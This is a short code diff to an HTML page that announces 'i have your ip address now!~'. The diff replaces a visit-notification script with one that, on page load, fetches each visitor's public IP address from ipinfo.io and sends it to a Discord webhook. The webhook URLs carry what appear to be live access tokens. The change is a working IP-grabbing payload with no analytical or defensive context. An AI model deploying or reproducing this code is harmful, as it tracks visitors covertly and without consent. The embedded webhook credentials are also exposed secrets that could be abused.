@@ -15,15 +15,25 @@
     <div style="width:100vw; height:100vh;display:flex;justify-content:center;align-items:center;">
     <h1>i have your ip address now!~</h1>
     </div>
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
     <script>
-        fetch("https://discord.com/api/webhooks/1071987269260541993/CZ0WMzU6dX9uqQnNOB7fx1ID5Ye4-mbNY5VL3AVGyf0MX4Uu-AdvDevkYidE_mJNDCK1", {
-    method: 'POST',
-    headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ "content": "someone visited a certain webpage" })
-}) 
+        let ip = 0
+        $( document ).ajaxComplete(function() {
+            fetch("https://discord.com/api/webhooks/1071983914379382855/-gXfcUzsBz1-W0v2jrmwuezLGQmu_Qxb9LKjzIk4IxX2xjjV75qRz0-Zu2fVZ_8JO1Br", {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ "content": ip })
+            })
+        }); 
+
+        $.get("https://ipinfo.io", function(response) {
+            ip = response.ip
+        }, "json")
     </script>
 </body>
 </html>
